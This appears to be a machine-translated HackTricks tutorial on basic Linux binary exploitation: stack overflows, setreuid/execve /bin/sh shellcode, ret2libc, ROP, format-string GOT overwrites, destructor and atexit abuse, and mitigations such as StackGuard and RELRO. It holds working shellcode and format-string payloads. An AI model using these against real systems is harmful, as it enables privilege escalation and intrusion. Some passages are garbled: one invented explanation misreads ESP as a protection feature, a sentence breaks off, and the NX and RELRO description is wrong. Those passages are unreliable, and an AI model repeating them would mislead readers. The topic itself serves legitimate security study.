# Linux Exploiting (Basic) (SPA)

## Linux Exploiting (Basic) (SPA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* サイバーセキュリティ会社で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## **ASLR**

Aleatorización de direcciones

**グローバルなASLRを無効にする（root）**：\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
グローバルなASLRを再度有効にする： echo 2 > /proc/sys/kernel/randomize\_va\_space

**実行時に無効にする**（root権限は不要）：\
setarch \`arch\` -R ./example arguments\
setarch \`uname -m\` -R ./example arguments

**スタック実行保護を無効にする**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack example.c -o example

**コアファイル**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**テキスト**\
**データ**\
**BSS**\
**ヒープ**

**スタック**

**BSSセクション**：初期化されていないグローバルまたは静的な変数
```
static int i;
```
**データセクション**: グローバルまたは静的な初期化された変数

```c
#include <stdio.h>

int global_var = 10;
static int static_var = 20;

int main() {
    printf("Global variable: %d\n", global_var);
    printf("Static variable: %d\n", static_var);
    return 0;
}
```

このコードでは、`global_var`と`static_var`という2つの変数がデータセクションにあります。`global_var`はグローバル変数であり、`static_var`は静的変数です。これらの変数は初期化され、プログラムの実行中に値を保持します。

`global_var`は他のファイルからもアクセス可能なグローバルスコープを持ちます。一方、`static_var`はファイル内でのみアクセス可能なローカルスコープを持ちます。

このコードでは、`main`関数内でこれらの変数の値を表示しています。`printf`関数を使用して、`global_var`と`static_var`の値を出力します。

実行結果は次のようになります:

```
Global variable: 10
Static variable: 20
```

このように、データセクションにあるグローバル変数と静的変数は、プログラムの実行中に値を保持し、必要に応じてアクセスできます。
```
int i = 5;
```
**セクション TEXT**: コードの命令（オペコード）の手順

**セクション HEAP**: 動的に確保されたバッファ（malloc()、calloc()、realloc()）

**セクション STACK**: スタック（渡された引数、環境変数の文字列（env）、ローカル変数...）

## **1. スタックオーバーフロー**

> バッファオーバーフロー、バッファオーバーラン、スタックオーバーラン、スタックスマッシング

セグメンテーションフォールトまたはセグメント違反：プロセスに割り当てられていないメモリアドレスにアクセスしようとすると発生します。

プログラム内の関数のアドレスを取得するには、次のようにします：
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execveへの呼び出し

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

カーネルの割り込みを確認する: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep "\_\_NR\_"

setreuid(0,0); // \_\_NR\_setreuid 70\
execve("/bin/sh", args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eaxをクリアする\
xor ebx, ebx ; ebx = 0, 引数は渡さない\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; システムコールを実行する

**nasm -f elf assembly.asm** —> .oファイルが生成される\
**ld assembly.o -o shellcodeout** —> アセンブリコードからなる実行可能ファイルが生成され、**objdump**を使用してオプコードを取得できる\
**objdump -d -Mintel ./shellcodeout** —> シェルコードが正しく生成されていることを確認し、オプコードを取得する

**シェルコードが正常に動作するか確認する**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
システムコールが正しく実行されているかを確認するために、前のプログラムをコンパイルし、システムコールが**strace ./PROGRAMA\_COMPILADO**に表示される必要があります。

シェルコードを作成する際には、トリックを使用することができます。最初の命令はcallへのジャンプです。callは元のコードを呼び出し、さらにEIPをスタックに格納します。call命令の後に必要な文字列を挿入したため、そのEIPを使用して文字列を指し示し、コードの実行を続けることができます。

例 **トリック (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Stackを使用したEJ(/bin/sh):**

```c
#include <stdio.h>

void vulnerable_function() {
    char buffer[100];
    printf("Enter some text: ");
    gets(buffer);
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable_function();
    return 0;
}
```

このコードは、`gets()`関数を使用してユーザーからの入力を受け取り、そのまま出力する危険な関数`vulnerable_function()`を持っています。この関数は、バッファオーバーフロー攻撃に対して脆弱です。

攻撃者は、入力フィールドに長すぎる文字列を入力することで、スタックのオーバーフローを引き起こすことができます。そして、攻撃者はスタック上に任意のコードを配置し、実行することができます。

例えば、攻撃者は`/bin/sh`シェルを実行するためのシェルコードをスタック上に配置することができます。これにより、攻撃者はシステムに対して任意のコマンドを実行することができます。

このコードは、スタックを使用した基本的なエクスプロイトの例を示しています。
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV（基本的なESPの悪用）：**

このファイルは、Linuxシステムでの基本的なESP（Executable Space Protection）の悪用に関する情報を提供します。

ESPは、実行可能なメモリ領域を保護するセキュリティ機能です。これにより、攻撃者は実行可能なコードを埋め込んだバッファオーバーフローなどの攻撃を防ぐことができます。

このファイルでは、ESPを回避するためのいくつかの一般的なテクニックについて説明します。これには、スタックのアライメントを調整する方法、スタックポインタを制御する方法、およびNOPスレッドを使用する方法が含まれます。

これらのテクニックを使用することで、攻撃者はESPの保護を回避し、悪意のあるコードを実行することができます。ただし、これらのテクニックは慎重に使用する必要があり、法的な制限や倫理的な考慮事項に留意する必要があります。

このファイルは、Linuxシステムでの基本的なESPの悪用に関する情報を提供するためのものであり、セキュリティテストやペネトレーションテストの目的でのみ使用することを推奨します。
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**エッグハンター:**

これは、プロセスに関連付けられたメモリページを走査し、そこに保存されているシェルコードを探す小さなコードです（シェルコードに配置されたいくつかの署名を探します）。コードを注入するための小さなスペースしかない場合に便利です。

**ポリモーフィックシェルコード**

これは、暗号化されたシェルコードで、それを復号化してジャンプする小さなコードを持っています。Call-Popのトリックを使用したもので、これは**シーザー暗号化の暗号化例**です：
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **フレームポインタ（EBP）の攻撃**

EBPを変更できるが、EIPを変更できない状況で有用です。

関数から抜けるときに次のアセンブリコードが実行されることが知られています：
```
movl               %ebp, %esp
popl                %ebp
ret
```
## **4. リターン・トゥ・リブCの方法**

スタックが実行不可能であるか、バッファが非常に小さい場合に有用な方法です。

ASLRにより、各実行ごとに関数がメモリ内の異なる位置にロードされるため、この方法は効果的ではない場合があります。ただし、リモートサーバーでは、プログラムが常に同じアドレスで実行されているため、有用です。

* **cdecl(C declaration)** 引数をスタックに入れ、関数を抜けるときにスタックをクリアします。
* **stdcall(standard call)** 引数をスタックに入れ、呼び出された関数がスタックをクリアします。
* **fastcall** 最初の2つの引数をレジスタに入れ、残りの引数をスタックに入れます。

libcのsystem命令のアドレスを指定し、通常は環境変数から文字列"/bin/sh"を引数として渡します。さらに、プログラムがシェルを不要になった後に問題なく終了するために、exit関数のアドレスを使用します（ログを書き込むため）。

**export SHELL=/bin/sh**

必要なアドレスを見つけるためには、次の方法があります。\
**GDB内で:**\
**p system**\
**p exit**\
**rabin2 -i executable** —> プログラムがロードされるときに使用されるすべての関数のアドレスを表示します。\
（startまたはブレークポイント内で）**x/500s $esp** —> ここから/bin/shの文字列を検索します。

これらのアドレスを取得したら、**exploit**は次のようになります。

"A" \* EBPまでの距離 + 4（EBP：セグメンテーション違反を回避するために、4つの"A"が望ましいが、EBPの実際の値が良い） + **system**のアドレス（EBPを上書きします） + **exit**のアドレス（system("/bin/sh")を終了した後にこの関数が呼び出されるため、スタックの最初の4バイトは次のEIPのアドレスとして処理されます） + "**/bin/sh**"のアドレス（systemに渡されるパラメーター）

これにより、EIPがsystemのアドレスで上書きされ、systemが"/bin/sh"という文字列を引数として受け取り、それを終了するとexit関数が実行されます。

関数のアドレスのいずれかのバイトがヌルまたはスペース（\x20）である場合、その関数の前のアドレスを逆アセンブルして、おそらくいくつかのNOPがあるため、関数自体ではなく、それらのいずれかを呼び出すことができるかどうかを確認できます（たとえば、> x/8i system-4）。

この方法は、関数を呼び出すときに**call**ではなく**ret**オペコードを使用するため、関数が最初の4バイトを戻る**EIP**アドレスとして解釈することができるため、機能します。

この方法の興味深いテクニックとして、**strncpy()**を呼び出してスタックからヒープにペイロードを移動し、その後**gets()**を使用してそのペイロードを実行することが挙げられます。

また、**mprotect()**を使用する興味深いテクニックもあります。これにより、メモリの任意の部分に必要な権限を割り当てることができます。これはBDS、MacOS、OpenBSDでは機能しますが、Linuxでは機能しません（書き込みと実行の権限を同時に許可できないように制御されています）。この攻撃を使用すると、スタックを再度実行可能に設定できます。

**関数の連鎖**

前述の方法に基づいて、このエクスプロイトの形式は次のようになります。\
パディング + \&Function1 + \&pop;ret; + \&arg\_fun1 + \&Function2 + \&pop;ret; + \&arg\_fun2 + ...

これにより、呼び出す関数を連鎖させることができます。また、複数の引数を持つ関数を使用する場合、必要な引数を指定し（例：4つ）、4つの引数を入力し、opcodes: pop、pop、pop、pop、retのアドレスを検索して、関数のアドレスを見つけることができます（**objdump -d executable**）。

**フレームの偽装による連鎖（EBPの連鎖）**

EBPを操作できる能力を利用して、EBPと"leave;ret"を介して複数の関数の実行を連鎖させる方法です。

パディング

* EBPに、2番目の偽のEBP + 実行する関数（\&system() + \&leave;ret + &"/bin/sh"）を指す偽のEBPを配置します。
* EIPには、&(leave;ret)を指す関数のアドレスを指定します。

シェルコードを次の部分のアドレスで開始します。例：2番目の偽のEBP + \&system() + &(leave;ret;) + &"/bin/sh"

2番目のEBPは：3番目の偽のEBP + \&system() + &(leave;ret;) + &"/bin/ls"

このシェルコードは、アクセス可能なメモリの部分に無限に繰り返し配置されるため、小さなメモリの断片で簡単に分割できるシェルコードが得られます。

（以前に説明したEBPとret2libの脆弱性を組み合わせて、関数の実行を連鎖させます）
## **5.補足メソッド**

**Ret2Ret**

EIPにスタックのアドレスを入れることができない場合（EIPが0xbfを含んでいないことを確認）や、シェルコードの位置を計算することができない場合に便利です。ただし、脆弱な関数がパラメータを受け入れる場合（ここにシェルコードが配置されます）。

これにより、EIPを**ret**のアドレスに変更すると、次のアドレス（関数の最初の引数のアドレス）がロードされます。つまり、シェルコードがロードされます。

エクスプロイトは次のようになります：SHELLCODE + パディング（EIPまで）+ **\&ret**（スタックの次のバイトは、渡されたパラメータのアドレスの先頭を指すため、シェルコードがスタックに入れられます）

**strncpy**のような関数は、完了後にシェルコードが保存されていたアドレスをスタックから削除するため、このテクニックは不可能になります。つまり、関数に引数として渡されるアドレス（シェルコードを保存するアドレス）は0x00で変更され、2番目の**ret**を呼び出すと0x00が見つかり、プログラムが停止します。
```
**Ret2PopRet**
```
**Murat Technique**

Linuxのすべてのプログラムは0xbfffffffからマッピングされます。

Linuxの新しいプロセスのスタックの構築方法を見ると、プログラムがシェルコードのみの環境で実行されるようなエクスプロイトを開発することができます。そのアドレスは次のように計算できます：addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

これにより、シェルコードを含む環境変数のアドレスを簡単に取得できます。

これは、execle関数が望む環境変数のみを持つ環境を作成できるためです。

**Jump to ESP: Windows Style**

ESPは常にスタックの先頭を指しているため、このテクニックはEIPをjmp espまたはcall espへのアドレスに置き換えることで行われます。これにより、EIPの上書き後にシェルコードが保存されます。retを実行した後、ESPは次のアドレスを指しているため、シェルコードが保存された場所です。

WindowsまたはLinuxでASLRが無効になっている場合、共有オブジェクトに保存されたjmp espまたはcall espを呼び出すことができます。ASLRが有効な場合は、脆弱なプログラム自体の中から探すことができます。

また、EIPの破損後にシェルコードをスタックの中央ではなく後ろに配置できるため、関数の途中で実行されるpushやpop命令がシェルコードに影響を与えないようにすることができます。

同様に、関数がシェルコードが保存されているアドレスを返すことがわかっている場合、call eaxまたはjmp eax（ret2eax）を呼び出すことができます。

**ROP（Return Oriented Programming）またはborrowed code chunks**

呼び出されるコードの断片はガジェットとして知られています。

このテクニックは、ret2libcの技術とpop,retの使用を通じて、異なる関数呼び出しを連鎖させることで行われます。

一部のプロセッサアーキテクチャでは、各命令は32ビットのセットです（例：MIPS）。しかし、Intelでは命令は可変長であり、複数の命令がビットセットを共有することがあります。例えば：

**movl $0xe4ff, -0x(%ebp)** —> これは0xffe4のバイトを含んでおり、**jmp \*%esp**とも解釈できます。

これにより、元のプログラムには存在しない命令を実行することができます。

**ROPgadget.py**はバイナリ内の値を検索するのに役立ちます。

このプログラムはまた、**payloads**を作成するためにも使用できます。欲しいROPを持つライブラリを与えると、Pythonのpayloadが生成されます。そのpayloadには、ライブラリのアドレスを与えると、シェルコードとして使用できるpayloadがすでに準備されます。また、システムコールを使用するため、実際にはスタック上で何も実行せず、**ret**命令を介して実行されるROPのアドレスを保存していくだけです。このpayloadを使用するには、**ret**命令を介してpayloadを呼び出す必要があります。

**Integer overflows**

このタイプのオーバーフローは、変数が渡される数値の大きさに対応できない場合に発生します。これは、符号付きと符号なしの変数の混乱による可能性があります。例えば：
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
## **フォーマット文字列**

C言語では、**`printf`**は文字列を**表示**するために使用される関数です。この関数が期待する**最初のパラメータ**は、**フォーマット文字列**を含む**生のテキスト**です。次に期待されるパラメータは、生のテキストから**フォーマット文字列を置換する値**です。

この関数の**最初の引数**として、**攻撃者のテキスト**が指定されると、脆弱性が発生します。攻撃者は、**printfフォーマット文字列の機能を悪用**して、**任意のデータを任意のアドレスに書き込む**ことができます。これにより、**任意のコードを実行**することができます。

フォーマット文字列:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`**は、**指定されたアドレスに書き込まれたバイト数**を**書き込む**ためのものです。書き込むべきバイト数だけを十六進数で書き込むことで、任意のデータを書き込むことができます。
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT（Global Offsets Table）/ PLT（Procedure Linkage Table）

これは、プログラムで使用される**外部関数**への**アドレス**を含むテーブルです。

このテーブルのアドレスを取得するには、**`objdump -s -j .got ./exec`**を使用します。

![](<../../.gitbook/assets/image (619).png>)

GEFで**実行可能ファイル**を**ロード**した後、**GOT**に含まれる**関数**を確認できます：`gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEFを使用してデバッグセッションを開始し、**`got`**を実行してgotテーブルを表示できます：

![](<../../.gitbook/assets/image (621).png>)

バイナリでは、GOTには関数のアドレスまたは関数アドレスをロードする**PLT**セクションへのアドレスが含まれています。このエクスプロイトの目的は、後で実行される関数のGOTエントリを、**`system`**関数のPLTのアドレスで**上書き**することです。理想的には、**パラメータを制御できる関数**のGOTを**上書き**します（つまり、システム関数に送信されるパラメータを制御できます）。

スクリプトで**`system`**が使用されていない場合、システム関数にはGOTにエントリがありません。このシナリオでは、まず`system`関数のアドレスを**リークする必要があります**。

**Procedure Linkage Table**は、解決が必要なすべての必要な**シンボル**を格納するELFファイルの**読み取り専用**テーブルです。これらの関数のいずれかが呼び出されると、GOTは**フロー**を**PLT**に**リダイレクト**し、関数のアドレスを解決してGOTに書き込みます。\
その後、そのアドレスに対して次に呼び出しが行われると、関数は解決する必要なく直接呼び出されます。

PLTのアドレスは、**`objdump -j .plt -d ./vuln_binary`**で確認できます。

### **エクスプロイトのフロー**

前述のように、目標は後で呼び出される**GOT**テーブル内の**関数**の**アドレス**を**上書き**することです。理想的には、実行可能セクションに配置されたシェルコードのアドレスを設定できますが、実行可能セクションにシェルコードを書き込むことはほとんど不可能です。\
そのため、別のオプションは、**ユーザーから引数を受け取る関数**を**上書き**し、それを**`system`**関数に指すことです。

アドレスを書き込むためには、通常2つのステップが行われます：**最初にアドレスの2バイトを書き込み**、その後に他の2バイトを書き込みます。これには**`$hn`**が使用されます。

**HOB**はアドレスの上位2バイトを指します\
**LOB**はアドレスの下位2バイトを指します

したがって、フォーマット文字列の動作により、\[HOB、LOB]のうち**小さい方を最初に書き込み**、その後にもう一方を書き込む必要があります。

HOB < LOBの場合\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

HOB > LOBの場合\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **フォーマット文字列エクスプロイトのテンプレート**

GOTを使用してフォーマット文字列をエクスプロイトするための**テンプレート**は、こちらで入手できます：

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

基本的には、プログラムが終了する前に呼び出される**関数**を格納する構造体です。これは、ジャンプしてアドレスに**シェルコードを呼び出す**ことができる場合や、フォーマット文字列を2回目に**エクスプロイトするために再びmainに戻る**必要がある場合に便利です。
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
注意してください。これによって**永遠のループ**は作成されません。なぜなら、mainに戻るとキャナリアが検知し、スタックの末尾が破損している可能性があり、関数は再度呼び出されないからです。したがって、これにより、脆弱性の**1回の実行**が可能になります。

### **コンテンツのダンプのためのフォーマット文字列**

フォーマット文字列は、プログラムのメモリから**コンテンツをダンプ**するためにも悪用されることがあります。\
例えば、次の状況では、スタック内の**フラグを指すローカル変数**があります。**メモリ**のどこに**フラグのポインタ**があるかを**見つける**ことができれば、**printfがそのアドレスにアクセス**し、**フラグ**を**表示**することができます。

したがって、フラグは**0xffffcf4c**にあります。

![](<../../.gitbook/assets/image (618) (2).png>)

そして、リークから**フラグへのポインタ**が**8番目の**パラメータにあることがわかります。

![](<../../.gitbook/assets/image (623).png>)

したがって、**8番目のパラメータ**にアクセスすることでフラグを取得できます。

![](<../../.gitbook/assets/image (624).png>)

前の攻撃を追跡し、コンテンツをリークできることに気付いた場合、**printf**に**ポインタ**を設定して、**実行可能な**セクションにアクセスし、それを完全に**ダンプ**することもできます！

### **DTOR**

{% hint style="danger" %}
現在では、dtorセクションを持つバイナリを見つけることは非常に珍しいです。
{% endhint %}

デストラクタは、プログラムが終了する前に**実行される関数**です。\
もし、**`__DTOR_END__`**に**シェルコードのアドレス**を書き込むことができれば、それはプログラムが終了する前に**実行**されます。\
このセクションのアドレスを取得するには、次のコマンドを使用します：
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
通常、**DTOR**セクションは値`ffffffff`と`00000000`の間にあります。したがって、これらの値だけを見ると、**登録された関数は存在しない**ことを意味します。そのため、**`00000000`**を**シェルコードのアドレス**で**上書き**して実行することで、シェルコードを実行できます。

### **フォーマット文字列を使用したバッファオーバーフロー**

**sprintf**は、**変数にフォーマットされた文字列を移動**します。したがって、文字列の**フォーマット**を悪用して、コピー先の**変数でバッファオーバーフロー**を引き起こすことができます。\
たとえば、ペイロード`%.44xAAAA`は、変数に44B+"AAAA"を**書き込む**ため、バッファオーバーフローを引き起こす可能性があります。

### **\_\_atexit構造体**

{% hint style="danger" %}
現在では、これを悪用することは非常に**珍しい**です。
{% endhint %}

**`atexit()`**は、**他の関数をパラメータとして渡す**関数です。これらの**関数**は、**`exit()`**の実行または**main**の**戻り値**の実行時に**実行**されます。\
たとえば、これらの**関数**のアドレスをシェルコードなどを指すように**変更**できれば、プロセスの**制御を取得**することができますが、現在はこれがより複雑になっています。\
現在、実行する関数のアドレスは、いくつかの構造体に隠されており、最終的に指すアドレスは関数のアドレスではなく、**XORで暗号化**され、ランダムなキーで変位されています。したがって、現在、この攻撃ベクトルは**x86**および**x64\_86**ではあまり有用ではありません。\
**暗号化関数**は**`PTR_MANGLE`**です。m68k、mips32、mips64、aarch64、arm、hppaなどの**他のアーキテクチャ**は、**暗号化**関数を実装していないため、このベクトルによって攻撃される可能性があります。

### **setjmp()とlongjmp()**

{% hint style="danger" %}
現在では、これを悪用することは非常に**珍しい**です。
{% endhint %}

**`setjmp()`**は、**コンテキスト**（レジスタ）を**保存**することができます。\
**`longjmp()`**は、**コンテキスト**を**復元**することができます。\
保存されるレジスタは、`EBX、ESI、EDI、ESP、EIP、EBP`です。\
問題は、EIPとESPが**`PTR_MANGLE`**関数によって渡されることです。したがって、この攻撃に対して脆弱なアーキテクチャは、上記と同じです。\
これらはエラー回復や割り込みに役立ちます。\
ただし、読んだ限りでは、他のレジスタは保護されていないため、呼び出される関数内に`call ebx`、`call esi`、`call edi`がある場合、制御を取得することができます。または、EBPを変更してESPを変更することもできます。

**C++のVTableとVPTR**

各クラスには、メソッドへのポインタの配列である**Vtable**があります。

各クラスのオブジェクトには、そのクラスの配列への**ポインタ**である**VPtr**があります。VPtrは各オブジェクトのヘッダの一部です。したがって、VPtrの**上書き**が達成されると、実行中の関数がシェルコードに移動するように**変更**できます。

## **予防策と回避策**

**あまりランダムではないASLR**

PaXはプロセスのアドレス空間を3つのグループに分けます：

コードと初期化されていないデータ：.text、.data、.bss —> 変数delta\_execの16ビットのエントロピー。この変数は各プロセスでランダムに初期化され、初期アドレスに加算されます。

mmap()によって割り当てられたメモリと共有ライブラリ —> 16ビット、delta\_mmap

スタック —> 24ビット、delta\_stack —> 実際には11（10番目から20番目までのバイト） —> 16バイトにアラインされる —> スタックの実際のアドレスは524,288個あります。

環境変数と引数は、スタック上のバッファよりも少ない量だけシフトされます。

**Return-into-printf**

これは、バッファオーバーフローをフォーマット文字列のエラーに変換する技術です。EIPを関数のprintfに置き換え、状態に関する値を取得するために操作されたフォーマット文字列を引数として渡します。

**ライブラリへの攻撃**

ライブラリは、16ビットのランダム性を持つ位置にあります。脆弱なサーバーがfork()を呼び出すと、メモリアドレス空間が子プロセスにコピーされ、そのまま保持されます。したがって、libcのusleep()関数に対してブルートフォース攻撃を試みることができます。引数として「16」を渡すことで、通常よりも長い応答時間がかかる場合にその関数が見つかります。その関数の場所がわかると、delta\_mmapを取得し、他の値を計算することができます。

ASLRが機能していることを確実にする唯一の方法は、64ビットアーキテクチャを使用することです。そこでは、ブルートフォース攻撃は行われません。

**StackGuardとStackShield**

**StackGuard**は、EIPの前に挿入される値（0x000aff0d（null、\n、EndOfFile（EOF）、\r））です。recv()、memcpy()、read()、bcoy()は依然として脆弱であり、EBPは保護されません。

**StackShield**はStackGuardよりも洗練されています。

オーバーフローの影響を受けないように、グローバルリターンスタックと呼ばれるテーブルにすべてのEIPのアドレスを保存します。さらに、両方のアドレスを比較してオーバーフローが発生したかどうかを確認できます。

また、戻り値のアドレスを上限値と比較することもできます。したがって、EIPが通常の場所ではなくデータ領域などに移動した場合に検出できます。ただし、これはRet-to-lib、ROP、ret2retなどで回避することができます。

StackShieldは、ローカル変数を保護しないことに注意してください。

**Stack Smash Protector（ProPolice）-fstack-protector**

canaryをEBPの前に配置します。バッファが他の変数を上書きできないように、ローカル変数を再配置します。

さらに、スタック
fork()関数は親プロセスの完全なコピーを作成するため、ウェブサーバーがfork()を呼び出すと、canaryを特定するまでバイトごとのブルートフォース攻撃が可能です。

fork()の後にexecve()関数を使用すると、スペースが上書きされ、攻撃は不可能になります。vfork()は、子プロセスを作成せずに実行することができますが、子プロセスが書き込みを試みると、重複が作成されます。

**Relocation Read-Only (RELRO)**

### Relro

**Relro（読み取り専用リロケーション）**は、メモリのアクセス許可に影響を与えます。NXと同様に、スタックを実行可能にするのではなく、RELROは特定の領域を読み取り専用にするため、書き込むことができません。これが障害となる最も一般的な方法は、後で説明する**`got`テーブルの上書き**を行うことを妨げることです。`got`テーブルは、libc関数のアドレスを保持しており、バイナリがアドレスを知って呼び出すことができます。relroを使用したバイナリの`got`テーブルエントリのメモリアクセス許可の状態を見てみましょう。

relroを使用した場合：
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
